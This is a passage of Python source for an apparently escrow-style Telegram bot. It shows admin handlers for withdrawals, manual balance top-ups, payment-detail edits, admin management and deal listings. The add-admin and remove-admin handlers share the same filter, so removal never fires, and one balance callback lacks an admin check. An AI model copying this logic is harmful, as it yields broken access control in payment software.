            text += f"#{rid} | {req['amount']} {req['currency']} | @{req['username']}\n"
            text += f"📝 {req['details'][:50]}\n"
            text += f"➡️ /confirm_withdraw {rid}\n\n"
        await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))


@dp.callback_query(lambda c: c.data == "change_photo")
async def change_photo_prompt(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} ACCESS DENIED", show_alert=True)
        return
    text = f"{pm('📷')} SEND NEW PHOTO FOR WELCOME MESSAGE.\nPHOTO MUST BE JPEG OR PNG."
    await safe_edit(callback, text)
    await state.set_state(PhotoStates.waiting_for_photo)


@dp.message(PhotoStates.waiting_for_photo)
async def save_photo_handler(message: types.Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        await message.answer(f"{pm('❌')} ACCESS DENIED")
        await state.clear()
        return

    if message.photo:
        file_id = message.photo[-1].file_id
        start_photo["file_id"] = file_id
        save_start_photo(start_photo)
        await message.answer(f"{pm('✅')} WELCOME PHOTO UPDATED!",
                             reply_markup=back_to_main_button(message.from_user.id))
        await log_to_master(f"🖼 Admin {message.from_user.full_name} changed start photo")
    else:
        await message.answer(f"{pm('❌')} SEND A PHOTO, NOT OTHER FILE")

    await state.clear()


@dp.callback_query(lambda c: c.data == "admin_add_balance")
async def admin_add_balance_start(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} ACCESS DENIED", show_alert=True)
        return
    await state.set_state(AdminAddBalanceState.waiting_for_user_id)
    text = f"{pm('💰')} ENTER TELEGRAM ID OF USER TO ADD BALANCE:\n\nTO FIND ID, USE @userinfobot"
    await safe_edit(callback, text)


@dp.message(AdminAddBalanceState.waiting_for_user_id)
async def admin_add_balance_user_id(message: types.Message, state: FSMContext):
    try:
        user_id = int(message.text.strip())
        await state.update_data(target_user_id=user_id)
        await state.set_state(AdminAddBalanceState.waiting_for_currency)
        await message.answer(f"{pm('💎')} SELECT CURRENCY:",
                             reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                                 [premium_button("TON", "admin_balance_TON", "💎")],
                                 [premium_button("STARS", "admin_balance_STARS", "⭐️")],
                                 [premium_button("RUB", "admin_balance_RUB", "💰")],
                                 [premium_button("UAH", "admin_balance_UAH", "🌐")]
                             ]))
    except ValueError:
        await message.answer(f"{pm('❌')} ENTER NUMERIC USER ID")


@dp.callback_query(lambda c: c.data.startswith("admin_balance_"))
async def admin_add_balance_currency(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[2]
    await state.update_data(target_currency=currency)
    await state.set_state(AdminAddBalanceState.waiting_for_amount)
    text = f"{pm('💰')} ENTER AMOUNT TO ADD IN {currency}:"
    await safe_edit(callback, text)


@dp.message(AdminAddBalanceState.waiting_for_amount)
async def admin_add_balance_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text.strip())
        if amount <= 0:
            raise ValueError
        data = await state.get_data()
        user_id = data["target_user_id"]
        currency = data["target_currency"]

        add_balance(user_id, currency, amount)

        await message.answer(f"{pm('✅')} ADDED {amount} {currency} TO USER (ID: {user_id})",
                             reply_markup=back_to_main_button(message.from_user.id))
        await log_to_master(
            f"💰 Admin @{message.from_user.username} added {amount} {currency} to user ID:{user_id}")

        try:
            await bot.send_message(
                user_id,
                f"{pm('💰')} YOUR BALANCE HAS BEEN TOPPED UP!\n\n"
                f"AMOUNT: {amount} {currency}\n\n"
                f"CHECK BALANCE: MAIN MENU → MY BALANCE"
            )
        except:
            pass

        await state.clear()
    except:
        await message.answer(f"{pm('❌')} ENTER A POSITIVE NUMBER")


@dp.callback_query(lambda c: c.data == "edit_rekvisits")
async def edit_rekvisits_panel(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} ACCESS DENIED", show_alert=True)
        return
    text = f"{pm('💳')} EDIT PAYMENT DETAILS\n\nSELECT CURRENCY TO EDIT:"
    await safe_edit(callback, text, reply_markup=rekvisits_edit_keyboard())


@dp.callback_query(lambda c: c.data == "edit_ton")
async def edit_ton(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} ACCESS DENIED", show_alert=True)
        return
    text = f"{pm('✏️')} ENTER NEW TEXT FOR TON PAYMENT:\n\nUSE {{amount}} FOR AMOUNT PLACEHOLDER"
    await safe_edit(callback, text)
    await state.update_data(rekv_type="ton")
    await state.set_state(RekvStates.waiting_for_rekv_text)


@dp.callback_query(lambda c: c.data == "edit_stars")
async def edit_stars(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} ACCESS DENIED", show_alert=True)
        return
    text = f"{pm('✏️')} ENTER NEW TEXT FOR STARS PAYMENT:\n\nUSE {{amount}} FOR AMOUNT PLACEHOLDER"
    await safe_edit(callback, text)
    await state.update_data(rekv_type="stars")
    await state.set_state(RekvStates.waiting_for_rekv_text)


@dp.callback_query(lambda c: c.data == "edit_rub")
async def edit_rub(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} ACCESS DENIED", show_alert=True)
        return
    text = f"{pm('✏️')} ENTER NEW TEXT FOR RUB PAYMENT:\n\nUSE {{amount}} FOR AMOUNT PLACEHOLDER"
    await safe_edit(callback, text)
    await state.update_data(rekv_type="rub")
    await state.set_state(RekvStates.waiting_for_rekv_text)


@dp.callback_query(lambda c: c.data == "edit_uah")
async def edit_uah(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} ACCESS DENIED", show_alert=True)
        return
    text = f"{pm('✏️')} ENTER NEW TEXT FOR UAH PAYMENT:\n\nUSE {{amount}} FOR AMOUNT PLACEHOLDER"
    await safe_edit(callback, text)
    await state.update_data(rekv_type="uah")
    await state.set_state(RekvStates.waiting_for_rekv_text)


@dp.message(RekvStates.waiting_for_rekv_text)
async def save_rekv_text(message: types.Message, state: FSMContext):
    data = await state.get_data()
    rekv_type = data.get("rekv_type")
    if rekv_type:
        rekvisits[rekv_type] = message.text.strip()
        save_rekvisits(rekvisits)
        await message.answer(f"{pm('✅')} PAYMENT DETAILS FOR {rekv_type.upper()} UPDATED!",
                             reply_markup=back_to_main_button(message.from_user.id))
        await log_to_master(f"💳 Admin {message.from_user.full_name} changed details for {rekv_type.upper()}")
    await state.clear()


@dp.callback_query(lambda c: c.data == "back_to_admin")
async def back_to_admin(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} ACCESS DENIED", show_alert=True)
        return
    text = f"{pm('👑')} ADMIN PANEL\n\nSELECT ACTION:"
    await safe_edit(callback, text, reply_markup=admin_panel_keyboard(callback.from_user.id))


@dp.callback_query(lambda c: c.data == "add_admin")
async def add_admin_prompt(callback: types.CallbackQuery):
    if callback.from_user.id != MASTER_ADMIN_ID:
        await callback.answer(f"{pm('❌')} MASTER ADMIN ONLY", show_alert=True)
        return
    text = f"{pm('📝')} ENTER TELEGRAM ID OF USER TO ADD AS ADMIN:"
    await safe_edit(callback, text)


@dp.message(lambda msg: msg.text and msg.text.isdigit() and msg.from_user.id == MASTER_ADMIN_ID)
async def add_admin_process(message: types.Message):
    user_id = int(message.text.strip())
    admins.add(user_id)
    save_admins(admins)
    await message.answer(f"{pm('✅')} USER {user_id} IS NOW ADMIN!", reply_markup=back_to_main_button(message.from_user.id))
    await log_to_master(f"👑 New admin added: {user_id}")


@dp.callback_query(lambda c: c.data == "remove_admin")
async def remove_admin_prompt(callback: types.CallbackQuery):
    if callback.from_user.id != MASTER_ADMIN_ID:
        await callback.answer(f"{pm('❌')} MASTER ADMIN ONLY", show_alert=True)
        return
    text = f"{pm('📝')} ENTER TELEGRAM ID OF USER TO REMOVE FROM ADMINS:"
    await safe_edit(callback, text)


@dp.message(lambda msg: msg.text and msg.text.isdigit() and msg.from_user.id == MASTER_ADMIN_ID)
async def remove_admin_process(message: types.Message):
    user_id = int(message.text.strip())
    if user_id == MASTER_ADMIN_ID:
        await message.answer(f"{pm('❌')} CANNOT REMOVE MASTER ADMIN")
        return
    if user_id in admins:
        admins.remove(user_id)
        save_admins(admins)
        await message.answer(f"{pm('✅')} USER {user_id} IS NO LONGER ADMIN.",
                             reply_markup=back_to_main_button(message.from_user.id))
        await log_to_master(f"👑 Admin removed: {user_id}")
    else:
        await message.answer(f"{pm('❌')} NOT FOUND")


@dp.callback_query(lambda c: c.data == "list_admins")
async def list_admins_callback(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} ACCESS DENIED", show_alert=True)
        return
    admin_list = "\n".join([f"• {aid}" for aid in admins])
    text = f"{pm('📊')} ADMIN LIST:\n\n{admin_list}"
    await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))


@dp.callback_query(lambda c: c.data == "all_deals")
async def all_deals_callback(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(f"{pm('❌')} ACCESS DENIED", show_alert=True)
        return
    if not deals:
        text = f"{pm('📭')} NO DEALS"
        await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))
    else:
        text = f"{pm('📊')} ALL DEALS\n\n"
        for deal_id, deal in list(deals.items())[-20:]:
            status_emoji = {"waiting_payment": pm('⏳'), "paid": pm('✅'), "awaiting_confirmation": pm('📦'),
                            "completed": pm('🎁')}.get(deal['status'], pm('❓'))
            text += f"{deal_id} | {status_emoji} | {deal['amount']} {deal['currency']}\n"
        await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))


@dp.callback_query(lambda c: c.data == "noop")
async def noop_callback(callback: types.CallbackQuery):
    await callback.answer(f"{pm('⏳')} WAIT FOR SELLER TO DELIVER PRODUCT")


@dp.callback_query(lambda c: c.data.startswith("support_"))
async def support_callback(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[1]
    await callback.answer()
    await callback.message.answer(
        f"{pm('💬')} FOR DEAL #{deal_id} SUPPORT CONTACT:\n@tonkeeperdealssupbot"
    )


# ========== ЗАПУСК ==========
async def main():
    print(f"{pm('🚀')} {BOT_NAME} STARTED")
    print(f"{pm('👑')} MASTER ADMIN: {MASTER_ADMIN_ID}")
    print(f"{pm('📊')} TOTAL ADMINS: {len(admins)}")
    print(f"{pm('🤖')} BOT: @{BOT_USERNAME}")
    print(f"{pm('💎')} SUPPORTED CURRENCIES: TON, STARS, RUB, UAH")
    print(f"{pm('🌐')} SUPPORTED LANGUAGES: Russian, English, Chinese, Arabic")
    print(f"{pm('✅')} PREMIUM EMOJIS LOADED")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
